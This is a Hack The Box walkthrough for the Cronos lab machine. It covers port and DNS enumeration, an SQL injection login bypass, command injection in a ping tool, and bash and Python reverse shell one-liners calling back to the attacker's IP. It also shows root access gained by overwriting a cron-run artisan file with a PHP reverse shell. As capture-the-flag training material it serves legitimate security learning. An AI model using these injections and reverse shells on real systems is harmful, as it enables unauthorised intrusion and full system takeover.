# Hack The Box - Cronos Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/cronos]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.13 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-18 23:48 EST
Nmap scan report for 10.10.10.13
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/18%OT=22%CT=1%CU=35486%PV=Y%DS=2%DC=I%G=Y%TM=63C8CBB
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11
OS:NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 18 23:48:50 2023 -- 1 IP address (1 host up) scanned in 31.96 seconds
```

We get back the following result showing that 3 ports are open:
- Port `22`: running `OpenSSH 7.2p2`
- Port `53`: running `ISC BIND 9.10.3`
- Port `80`: running `Apache httpd 2.4.18`


Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything.

So I ran an Nmap scan that covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/beep]
└─$ sudo nmap -sC -sV -O -p- -oA nmap/initial 10.10.10.7 -Pn

[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-18 23:52 EST
Nmap scan report for 10.10.10.13
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/18%OT=22%CT=1%CU=35060%PV=Y%DS=2%DC=I%G=Y%TM=63C8CDD
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=I%TS=8)OPS(O1=M
OS:539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%
OS:O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%
OS:DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 18 23:57:55 2023 -- 1 IP address (1 host up) scanned in 339.28 seconds
```

We get back the following result. No other ports are open.

Apart from this, I also ran general nmap vulnerability scan scripts to determine if any of the services are vulnerable

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Cronos]
└─$ nmap --script vuln 10.10.10.13 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-18 23:55 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.13
Host is up (0.12s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
53/tcp   open     domain
80/tcp   open     http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
2043/tcp filtered isis-bcast

Nmap done: 1 IP address (1 host up) scanned in 364.70 seconds
```

## Enumeration
Port `80` was open so I visited it first with the IP provided.

![crn-1](https://user-images.githubusercontent.com/87711310/213371726-d0e868c6-03f7-4077-b7a8-05c6d8f4cd59.png)

I didn’t get anything useful. So i started enumerating the directories

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Cronos]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.13
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/18 23:48:51 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 299]
                                               
===============================================================
2023/01/19 00:35:04 Finished
===============================================================

```

Another dead end. At this point, I just googled `Apache2 Ubuntu Default Page` since if it was a real `Apache Default page`, `gobuster` would have been able to enumerate more directories that it enumerated.

After googling `Apache2 Ubuntu Default Page`, the first link I found was [this](https://askubuntu.com/questions/603451/why-am-i-getting-the-apache2-ubuntu-default-page-instead-of-my-own-index-html-pa). It seems that this was due a configuration issue where the IP address doesn't know what hostname it should map to in order to serve a specific site and so instead it's serveing the `Apache2 Ubuntu Default page`

After looking at the [documentation](https://httpd.apache.org/docs/2.4/vhosts/examples.html) for virtual host configuration in Apache, we need to perform two things.
1. Figure out the hostname(s) that the given IP address resolves to.
2. Add those entries in the /etc/hosts file.

For this, I firstly used `nslookup` to figure out the domain name
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Cronos]
└─$ nslookup  
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
````

You can see that the IP resolves to `ns1.cronos.htb`. This gives us a domain name of `cronos.htb`

So, then, I add this above entry to my `/etc/hosts` file.

```
10.10.10.13  cronos.htb
```

Now when I browsed to `cronos.htb` page it resolved to 10.10.10.13 and knows which page to server based on the virtual hosts configuration.

![crn-2](https://user-images.githubusercontent.com/87711310/213374218-8f21dac4-65a8-4155-b5db-53a038095fc4.png)

Now that I had a working domain name, I tried to enumerate it to find out its directories or other hosts(since it a domain name, it may have sub-domains).

So, i first started by looking for `vhosts` using `gobuster`
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Cronos]
└─$ gobuster vhost -u cronos.htb --wordlist=/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://cronos.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/01/19 01:52:42 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.cronos.htb (Status: 200) [Size: 1547]
                                                  
===============================================================
2023/01/19 01:53:49 Finished
===============================================================

```

And I found `admin.cronos.htb`

Next, i started looking for `dns` using `gobuster`

```
```
While looking for directories, I couldn't find anything expect for some basic `css` and `js` directory

```
──(darshan㉿kali)-[/usr/share/linux-exploit-suggester]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u cronos.htb 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cronos.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/19 01:53:30 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 306] [--> http://cronos.htb/css/]
/js                   (Status: 301) [Size: 305] [--> http://cronos.htb/js/] 

```

I was pretty sure that `admin.cronos.htb` was the way to further exploit the machine

Before moving on to that, I found another easier trick to find out all the hosts in a domain

```
┌──(darshan㉿kali)-[/usr/share/linux-exploit-suggester]
└─$ host -l cronos.htb 10.10.10.13
Using domain server:
Name: 10.10.10.13
Address: 10.10.10.13#53
Aliases: 

cronos.htb name server ns1.cronos.htb.
cronos.htb has address 10.10.10.13
admin.cronos.htb has address 10.10.10.13
ns1.cronos.htb has address 10.10.10.13
www.cronos.htb has address 10.10.10.13
                                        
```

This was much easier and look lesser time to get back the results.

Now, as usual, I added these newly found entries to my `/etc/hosts` file and visited the `admin` page

![crn-3](https://user-images.githubusercontent.com/87711310/213377736-5473cad6-b10b-44d1-b0f0-aecbbe203a25.png)

I tried using common credentials(admin:admin, admin:cronos, ...) but none seem to work and I slightly shifted my mind to bypass this login page using `SQL Injection`

I used [this](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/) SQL Injection cheatsheet and tried couple of payloads until I found the one through which I could bypass the login page

```
admin' #
```

Once I bypassed the authentication, I was presented with the `welcome` page

![crn-4](https://user-images.githubusercontent.com/87711310/213378586-b3c3ac85-08b3-4bbb-9b14-5d1f4d0c1040.png)

You could also use `SQLmap` to bypass the authentication mechanism.
- Intercept the request using Burp
- save it in a file with `.txt` extension (login.txt)
- Run the following sqlmap command
```
sqlmap -v 4 -r login.txt
```

![crn-5](https://user-images.githubusercontent.com/87711310/213379010-44b0022c-a354-474f-b585-a2d41f11e82c.png)

On looking at the `welcome` page, we see commands like `traceroute` and `ping` being used. This format is a general CTF format where you have to concatnate a payload to the IP address input field and either get a `reverse shell` or perform `directory traversal` or something else.

So firstly I tried to find out if its vulnerable to `command injection` using the following command.

```
8.8.8.8 & whoami
```

What the above command does is run the the preceding command (ping 8.8.8.8) in the background and execute the whoami command.

I got back the following result and its definitely vulnerable.

The web server is running with the privileges of the web daemon user www-data.

![crn-6](https://user-images.githubusercontent.com/87711310/213379559-92ac67f1-ab95-4e48-ba73-197b1e3e2fa9.png)

Now, since we can run arbitrary commands using this tool, I tried getting it to send a reverse shell back to my machine.

I turned on Burp, Intercepted the request and sent it to Repeater

Then I grabed a reverse shell from [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and change the IP and port to those apllicable to my machine

```
/bin/bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
```

Set up a listener on the attack machine.
```
nc -lvnp 4444
```

Executed the request and it didn’t send a reverse shell back.

![crn-7](https://user-images.githubusercontent.com/87711310/213381558-34218458-2c13-4f5d-a4ef-11a6d569217a.png)


So i checked if `bash` was installed on the machine.
```
which bash
```

![crn-8](https://user-images.githubusercontent.com/87711310/213381565-d3071183-0a4c-4e8d-9137-b7113ed63cd6.png)

It was installed but I wasn't sure that why it didn't work so I tried python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

DO NOT FORGET TO URL ENCODE THE PAYLOAD BEFORE SENDING IT (USE `CTRL+U` TO URL ENCODE IN BURP)

Once I sent the request, I got a low privileged reverse shell on my mahcine

![crn-9](https://user-images.githubusercontent.com/87711310/213382326-bb83c301-da1a-4324-8ab6-e1cdfd0a9c99.png)

```
──(darshan㉿kali)-[/usr/share/linux-exploit-suggester]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.13] 36292
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

I upgraded it to a better shell using the follwoing command:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

After this, I grabbed the `user.txt`

```
www-data@cronos:/$ ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
www-data@cronos:/$ cd home
cd home
www-data@cronos:/home$ ls 
ls
noulis
www-data@cronos:/home$ cd noulis
cd noulis
www-data@cronos:/home/noulis$ ls
ls
user.txt
www-data@cronos:/home/noulis$ cat user.txt
cat user.txt
[REDACTED]

```

## Privilege Escalation

Once I retrieved the user flag, I ran `sudo -l` to see what services I could have ran as root but unfrtunately i couldnt run any.

So i decided to use [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to find out the potential attack vectors on the victim machine.

I set up a server in the same directory that the linpeas script resides in.

```
python3 -m http.server 8888
```

On the target machine, I moved to `/tmp` and used `wget` command to get the script from my machine

```
cd /tmp
wget http://10.10.14.6:8888/linpeas.sh
```

Gave it execute privileges
```
chmod +x linpeas.sh
```

And ran the script
```
./linpeas.sh
```

Considering the name of the box, I looked any Potential Red marks in the Crontab section.

![crn-10](https://user-images.githubusercontent.com/87711310/213383690-c2d47c28-12a9-4dcd-89c7-47e5e748d22f.png)

Looking at the permissions and the owner of the `artisan` file

```
www-data@cronos:/tmp$ ls -l /var/www/laravel
ls -l /var/www/laravel
total 2084
-rw-r--r--  1 www-data www-data     727 Apr  9  2017 CHANGELOG.md
drwxr-xr-x  6 www-data www-data    4096 May 10  2022 app
-rwxr-xr-x  1 www-data www-data    5492 Jan 19 07:51 artisan
drwxr-xr-x  3 www-data www-data    4096 May 10  2022 bootstrap
-rw-r--r--  1 www-data www-data    1300 Apr  9  2017 composer.json
-rw-r--r--  1 www-data www-data  121424 Apr  9  2017 composer.lock
-rwxr-xr-x  1 www-data www-data 1836198 Apr  9  2017 composer.phar
drwxr-xr-x  2 www-data www-data    4096 May 10  2022 config
drwxr-xr-x  5 www-data www-data    4096 May 10  2022 database
-rwxr-xr-x  1 www-data www-data   83454 Jan  7  2020 linux-exploit-suggester.sh
-rw-r--r--  1 www-data www-data    1062 Apr  9  2017 package.json
-rw-r--r--  1 www-data www-data    5492 Jan 19 07:50 php-rev-shell.php
-rw-r--r--  1 www-data www-data    1055 Apr  9  2017 phpunit.xml
drwxr-xr-x  4 www-data www-data    4096 May 10  2022 public
-rw-r--r--  1 www-data www-data    3424 Apr  9  2017 readme.md
drwxr-xr-x  5 www-data www-data    4096 May 10  2022 resources
drwxr-xr-x  2 www-data www-data    4096 May 10  2022 routes
-rw-r--r--  1 www-data www-data     563 Apr  9  2017 server.php
drwxr-xr-x  5 www-data www-data    4096 May 10  2022 storage
drwxr-xr-x  4 www-data www-data    4096 May 10  2022 tests
drwxr-xr-x 31 www-data www-data    4096 May 10  2022 vendor
-rw-r--r--  1 www-data www-data     555 Apr  9  2017 webpack.mix.js
www-data@cronos:/tmp$ 
```

Looking at the `artisan` file, the cron job wass running the file using the PHP command so whatever code I add should be in PHP.

So I headed over to [Pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and grabed the PHP reverse shell file, changed the IP and Port according to my machine, transferred it to the same `/var/www` directory and then copied the contents of `php-reverese-shell` to the `artisan` i.e rewrote it.

Set up another listener and waited for a minute and I had a root privileged reverse shell.
```
┌──(darshan㉿kali)-[~/Desktop]
└─$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.13] 41768
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 07:53:01 up  1:05,  0 users,  load average: 0.00, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

I grabbed the root flag
```
# cat /root/root.txt
[REDACTED]
```

Another way to find ways to escalated the privileges is to transfer [Linux-Exploit-Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) and run it on the target machine to see if the machine is vulnerable to any privilege escalation exploits.

```
$ wget http://10.10.14.6:9999/linux-exploit-suggester.sh
--2023-01-19 08:00:04--  http://10.10.14.6:9999/linux-exploit-suggester.sh
Connecting to 10.10.14.6:9999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 83454 (81K) [text/x-sh]
Saving to: 'linux-exploit-suggester.sh'

     0K .......... .......... .......... .......... .......... 61%  199K 0s
    50K .......... .......... .......... .                    100%  257K=0.4s

2023-01-19 08:00:04 (218 KB/s) - 'linux-exploit-suggester.sh' saved [83454/83454]

$ chmod +x linux-epxloit-suggester.sh
chmod: cannot access 'linux-epxloit-suggester.sh': No such file or directory
$ chmod +x linux-exploit-suggester.sh
$ ./linux-exploit-suggester.sh

Available information:

Kernel version: 4.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 16.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

73 kernel space exploits
43 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]                                                                                                                                          
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847.cpp
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

...
```

One important exploit I could recognize was [Dirty Cow](https://www.exploit-db.com/exploits/40839) exploit.



